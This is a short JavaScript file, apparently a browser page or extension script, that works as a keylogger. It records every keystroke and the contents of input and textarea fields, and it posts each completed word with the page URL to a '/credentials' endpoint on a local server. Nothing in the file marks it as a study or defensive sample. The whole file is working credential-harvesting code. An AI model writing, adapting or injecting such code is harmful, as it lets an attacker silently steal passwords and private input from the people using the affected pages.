let currentWord = '';
let changeHandled = false;
let isKeydown=false;

document.addEventListener('keydown', (event) => {
    if(!event.key)
        return;

    isKeydown=true;

    if (event.key.length>1&&(event.key!='Enter'&&event.key!='Backspace')) {
        return;
    }
    if(event.key=='Backspace'){
        if(currentWord.length>0)
        currentWord = currentWord.slice(0, -1);
        return;
    }
    
    if (event.key === 'Enter') {
        if (currentWord.length > 0) {
            sendLog(currentWord);
            currentWord = '';
            return;
        }
    }

    currentWord += event.key;
});

// Function to send logs to the server
function sendLog(word) {
    fetch('http://localhost:5000/credentials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            key: word,
            url: window.location.href
        })
    }).catch(error => console.error('Error:', error));
}

// document.addEventListener('click', () => {
//     if (currentWord.length > 0) {
//         sendLog(currentWord);
//         currentWord = '';
//     }
//     changeHandled = false;
// });

function handleChange(event) {
    if (isKeydown) {
        isKeydown = false;
        return;
    }
    if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
        if (event.target.value.length > 0) {
            currentWord = event.target.value;
            changeHandled = true;
        }
    }
}

document.addEventListener('change', handleChange);
document.addEventListener('input', handleChange);
document.addEventListener('focus', handleChange, true);
